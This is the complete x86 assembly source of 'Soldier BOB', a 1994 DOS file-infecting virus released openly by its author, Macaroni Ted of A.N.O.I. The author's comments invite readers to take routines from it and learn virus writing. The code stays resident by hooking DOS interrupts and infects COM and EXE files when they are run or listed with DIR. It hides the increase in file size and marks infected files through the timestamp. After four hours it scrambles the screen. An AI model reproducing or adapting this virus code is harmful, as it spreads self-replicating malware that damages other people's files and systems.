		.model tiny
		.code
		org     100h

; I made this virus for several month ago, then I forgott it. I recently found
; it on my harddrive, and I compiled it and tried it. To my amazement it worked!
;
; Soldier BOB infects .COM and .EXE files when you execute a file. It also
; saves up to 20 files into a buffer when you use the dos-command 'DIR'. And
; later when dos is counting how much diskspace that's free Soldier BOB will
; infect all files stored into the buffer. Filesize increases are hidden.
; When Soldier BOB has been resident for four hours it will fuck-up the whole
; screen. Try this routine, it's fun to see when your screen being totally mad.
;
; I don't really know exactly what Soldier BOB does because I haven't time to
; figure out all details, but since I've brought the source code, you are free
; to investigate that by yourself.
;
; Please feel free to rip routines and ideas from this source-code. My purpose
; is that everybody (who wants to) can be able to learn how to write a decent
; virus.
;
; If you need any help to write a virus, please do not hesitate to contact
; me on Internet.
;
; - regards, Macaroni Ted / A.N.O.I - 11-27-94

 ;(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=);
 ;                     A NEW ORDER OF INTELLIGENCE PRESENTS:                 ;
 ;                                                                           ;
 ;                             S O L D I E R   B O B                         ;
 ;                                                                           ;
 ;             Copyright (c) Jan-Mar 1994 by Macaroni Ted / A.N.O.I.         ;
 ;                                                                           ;
 ;(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=)=(=);

start:
		call    get_bp
get_bp:         pop     bp

		mov     ax,0ff4eh                ;(?N-)
		int     21h
		cmp     ax,4f49h                 ;(-OI)
		je      already_res

		push    ds es

		mov     ah,2ch
		int     21h
		add     ch,4
		mov     cs:start_time,ch

		call    hook_memory

		push    es
		pop     ds

		call    hook_interrupts

		pop     es ds
already_res:
		cmp     word ptr cs:[bp+(exe_header-get_bp)],'ZM'
		je      exit_exe
exit_com:
		lea     si,[bp+(exe_header-get_bp)]
		mov     di,100h
		cld
		movsb
		movsb
		movsb
		movsb
		movsb

		xor     ax,ax
		mov     bx,ax
		mov     cx,ax
		mov     dx,ax
		mov     si,ax
		mov     di,ax

		push    cs
		push    100h
		retf
exit_exe:
		mov     ax,es                    ;to code seg
		add     ax,10h

		add     ax,word ptr cs:[bp+(exe_header+16h-get_bp)]
		push    ax
		push    word ptr cs:[bp+(exe_header+14h-get_bp)]
		retf

original_int21h dd      ?
original_int1Bh dd      ?
original_int09h dd      ?
original_int1Ch dd      ?
start_time      db      ?

		db      'Soldier BOB - (c)jan-94 by A:N:O:I',10,13
		db      'Programmed by Macaroni Ted'

hook_memory:
		push    ds

		push    cs
		pop     ds

		mov     cx,es
		dec     cx
		mov     es,cx
		mov     bx,word ptr es:[3h]
		mov     dx,virlen
		mov     cl,4
		shr     dx,cl
		add     dx,4
		mov     cx,es
		sub     bx,dx
		inc     cx
		mov     es,cx
		mov     ah,4ah
		int     21h

;               jc      exit_com
		mov     ah,48h
		dec     dx
		mov     bx,dx                    ;it's done
		int     21h

;               jc      exit_com
		dec     ax
		mov     es,ax
		mov     cx,8h
		mov     word ptr es:[1h],cx
		sub     ax,0fh
		mov     di,100h                  ;begin of virus
		mov     es,ax
		lea     si,[bp+(start-get_bp)]
		mov     cx,virlen                ;<=== virus len
		cld
		repne   movsb

		pop     ds
		ret

hook_interrupts:                                 ;int 21h
		mov     ax,3521h
		int     21h
		mov     word ptr [original_int21h],bx
		mov     word ptr [original_int21h+2],es
		mov     ax,2521h
		lea     dx,new_int_21h
		int     21h

		mov     ax,351ch                 ;int 1Ch
		int     21h
		mov     word ptr [original_int1ch],bx
		mov     word ptr [original_int1ch+2],es
		mov     ax,251ch
		lea     dx,new_int_1ch
		int     21h
		ret

push_all:
		pop     cs:tmp_adr
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    bp
		push    ds
		push    es
		jmp     word ptr cs:tmp_adr

tmp_adr         dw      ?
		db      'Soldier BOB - Made in Sweden'
pop_all:
		pop     cs:tmp_adr
		pop     es
		pop     ds
		pop     bp
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		jmp     word ptr cs:tmp_adr
int21h:
		pushf
		call    dword ptr cs:original_int21h
		retn
scroll:                                          ;input ax
		push    bx dx cx ax
		mov     dx,3D4h
		push    ax
		and     al,0Fh
		mov     ah,8
		xchg    al,ah
		out     dx,ax

		pop     ax
		mov     cl,4
		shr     ax,cl
		mov     cx,50h
		mul     cx
		mov     cl,al
		mov     al,0Ch
		mov     dx,3D4h
		out     dx,ax

		mov     ah,cl
		inc     al
		out     dx,ax

		pop     ax cx dx bx
		ret

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                 Int 21h
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
new_int_21h:
		pushf

		call    push_all

		mov     ah,2ch
		call    int21h
		mov     cs:time_h,ch

		call    pop_all

		cmp     ah,4bh                   ;execute
		je      execute_file

		cmp     ah,11h                   ;fool dir
		je      find__
		cmp     ah,12h
		je      find__

		cmp     ah,4eh                   ;dos 2.x
		je      find_
		cmp     ah,4fh
		je      find_

		cmp     ah,36h                   ;get free space
		je      get_free_space

		cmp     ax,0ff4eh                ;mem check (?N)
		je      mem_check

exit_21h:
		popf
		jmp     dword ptr cs:original_int21h
mem_check:
		mov     ax,4f49h                 ;(OI)
		popf
		iret
find_:
		jmp     find_new
find__:
		jmp     find_old

file_date       dw      ?
file_time       dw      ?
file_size1      dw      ?
file_size2      dw      ?
attribute       dw      ?

mask_com        db      '*.com',0
mask_exe        db      '*.exe',0
infected_files  dw      0


execute_file:
		call    infect                   ;infect ds:dx
		jmp     exit_21h
get_free_space:
		call    push_all
		push    cs cs
		pop     ds es

		lea     si,file_buffer
restore_buffer:
		lodsb
		cmp     al,0ffh                  ;end of buffer
		je      done_infecting
		dec     si

		push    si                       ;infect it
		mov     dx,si
		call    infect
		pop     si
get_eo_name:
		lodsb
		cmp     al,0ffh
		je      done_infecting
		or      al,al
		jnc     get_eo_name
		jmp     restore_buffer

done_infecting:
		mov     byte ptr cs:[file_buffer],0ffh ;clear buffer
		call    pop_all
		jmp     exit_21h

find_old:
		popf

		call    int21h
		cmp     al,0ffh
		jne     push_it
		jmp     no_more_files
push_it:
		call    push_all

		mov     ah,2fh                   ;get dta
		int     21h

		push    es                       ;es:bx
		pop     ds                       ;ds:bx
		mov     si,bx                    ;ds:si

		add     si,16                    ;ext name
		lodsw
		mov     dx,ax
		lodsb
		cmp     dx,'OC'                  ;ext=COM?
		jne     check_exe
		cmp     al,'M'
		jne     check_exe
		jmp     ext_ok
check_exe:
		cmp     dx,'XE'                  ;ext=EXE?
		jne     cancel_ff
		cmp     al,'E'
		jne     cancel_ff
ext_ok:
;               mov     si,bx
;               add     si,38
;               lodsw
;               cmp     ax,0
;               jne     cancel_ff

		mov     si,bx                    ;check if already infected
		add     si,30
		lodsw                            ;time
		and     al,00011111b
		cmp     al,14
		je      infected                 ;already infected (sec=28)

		push    cs
		pop     es

		lea     di,file_buffer
		mov     cx,260
get_end_of_buffer:
		mov     al,byte ptr es:[di]
		cmp     al,0ffh                  ;end of buffer?
		je      end_of_buffer
		inc     di
		loop    get_end_of_buffer
end_of_buffer:
		cmp     cx,14
		jb      cancel_ff

		mov     si,bx
		add     si,8                     ;filename

		mov     cx,8
copy_filename:
		lodsb
		cmp     al,20h
		je      copy_filename_klar
		stosb
		loop    copy_filename
copy_filename_klar:
		mov     al,'.'
		stosb
		mov     si,bx                    ;copy ext
		add     si,16
		movsb
		movsb
		movsb
		mov     al,0
		stosb
		mov     al,0ffh
		stosb

		jmp     cancel_ff
infected:
		mov     si,bx                    ;alter size
		add     si,36
		mov     di,si
		lodsw
		sub     ax,virlen
		jz      cancel_ff
		stosw
cancel_ff:
		call    pop_all
no_more_files:  retf    2                        ;iret flags

find_new:
		popf

		call    int21h
		jnc     more_files
		retf    2
more_files:
		pushf
		call    push_all

		mov     ah,2fh                   ;get dta
		int     21h

		push    es                       ;es:bx
		pop     ds                       ;ds:bx
		mov     si,bx                    ;ds:si

		add     si,1eh                   ;filename
get_ext:
		lodsb
		or      al,al
		jnz     get_ext
		sub     si,4
		lodsw
		cmp     ax,'XE'
		je      check_E
		cmp     ax,'OC'
		je      check_M
		cmp     ax,'xe'
		je      check_e
		cmp     ax,'oc'
		je      check_m
		jmp     cancel_new
check_E:
		lodsb
		cmp     al,'E'
		je      ext_is_ok
		cmp     al,'e'
		je      ext_is_ok
		jmp     cancel_new
check_M:
		lodsb
		cmp     al,'M'
		je      ext_is_ok
		cmp     al,'m'
		je      ext_is_ok
		jmp     cancel_ff
ext_is_ok:
		mov     si,bx
		add     si,16h
		lodsw                            ;time
		and     al,00011111b
		cmp     al,14
		je      infected2                ;already infected (sec=28)

		mov     dx,bx
		add     dx,1eh
		call    infect

		jmp     cancel_new
infected2:
		mov     si,bx
		add     si,1ah
		mov     di,si
		lodsw                            ;alter size
		sub     ax,virlen
		jz      cancel_new
		stosw
cancel_new:
		call    pop_all
		popf
		retf    2

infect:
		call    push_all
		mov     si,dx

		mov     ax,4300h                 ;get attrib
		int     21h
		mov     cs:attribute,cx          ;save it
		xor     cx,cx
		mov     ax,4301h                 ;force all attribs
		int     21h

;               mov     ax,6C00h                 ;open file
;               mov     bx,0010000011000010b     ;read/write disable int 24h
;               mov     dx,0000000000010001b     ;error if not found, != open
;               int     21h
		mov     ax,3d02h
		mov     dx,si
		int     21h
		mov     bx,ax

		push    cs cs
		pop     ds es

		mov     ah,57h                   ;get file date/time
		mov     al,0
		int     21h
		mov     file_date,dx
		mov     file_time,cx

		mov     ah,3fh                   ;read (exe) header
		mov     cx,1ch
		lea     dx,exe_header
		int     21h

		cmp     word ptr [exe_header+12h],'IA'  ;already infected(exe)
		jne     check_com
		jmp     close_file
check_com:
		cmp     word ptr [exe_header],'IA'      ;already infected(com)
		jne     goto_end
		jmp     close_file
goto_end:
		mov     ax,4202h                        ;goto end of file
		mov     cx,0
		mov     dx,0
		int     21h
		mov     file_size1,ax
		mov     file_size2,dx

		mov     ah,40h
		lea     dx,start
		mov     cx,virlen
		int     21h

		mov     ax,4200h
		mov     cx,0
		mov     dx,0
		int     21h

		cmp     word ptr [exe_header],'ZM'
		jne     infect_com
		jmp     infect_exe
infect_com:
		cmp     file_size2,0
		jne     close_file
		mov     ax,file_size1
		sub     ax,5
		mov     jmp_2,ax

		mov     ah,40h
		mov     cx,5
		lea     dx,jmp_1
		int     21h

		jmp     close_file
infect_exe:
		mov     ax,4202h
		mov     dx,0
		mov     cx,0
		int     21h

		mov     cx,200h                  ;512
		div     cx
		inc     ax
		mov     word ptr [exe_header+2],dx
		mov     word ptr [exe_header+4],ax

		mov     ax,file_size1            ;old file size
		mov     dx,file_size2

		mov     cx,10h
		div     cx
		sub     ax,word ptr [exe_header+8h]
		mov     word ptr ds:[exe_header+16h],ax
		mov     word ptr ds:[exe_header+14h],dx

		mov     word ptr [exe_header+12h],'IA'

		mov     ax,4200h
		mov     dx,0
		mov     cx,0
		int     21h

		mov     ah,40h                   ;write exe header
		mov     cx,1Ch
		lea     dx,exe_header
		int     21h
close_file:
		mov     dx,file_date
		mov     cx,file_time
		and     cl,11100000b
		or      cl,00001110b             ;secs = 28

		mov     ax,5701h                 ;set time/date
		int     21h

		mov     ah,3eh                   ;close file
		int     21h

		call    pop_all
		call    push_all                 ;restore filename

		mov     ax,4301h                 ;set attrib original attrib
		mov     cx,cs:attribute
		int     21h

		call    pop_all
		ret

exe_header      db      41h,49h,90h,0cdh,20h     ;5 first bytes
		db      1Ch-5 dup(0)             ;28

jmp_1           db      41h,49h                  ;inc cx, dec cx
		db      0e9h                     ;jmp
jmp_2           dw      ?                        ;xxxx


file_buffer     db      0ffh,259 dup(0)          ;20 filename 12345678.123,0

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                 Int 1Bh
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
new_int_1Bh:
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                 Int 09h
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
new_int_09h:
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                 Int 1Ch
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
new_int_1Ch:
		call    push_all

		mov     al,cs:start_time
		cmp     al,cs:time_h
		jne     exit_1ch
		jmp     rave_it
exit_1Ch:
		call    pop_all
		jmp     dword ptr cs:original_int1Ch

time_h          db      0

scroll_pos      dw      32                       ;bx
do_inc          dw      0                        ;dx

rave_it:
		inc     cs:do_inc
		cmp     cs:do_inc,3
		jne     dont_high
		mov     cs:do_inc,0
		inc     cs:scroll_pos
dont_high:
		mov     cx,cs:scroll_pos
		mov     ax,0
scroll_1:
		call    scroll
		inc     ax
		loop    scroll_1

		mov     cx,cs:scroll_pos
		add     cx,cx
scroll_2:
		call    scroll
		dec     ax
		loop    scroll_2
		jmp     rave_it


virlen          equ     offset eof - offset start
eof:
		end     start

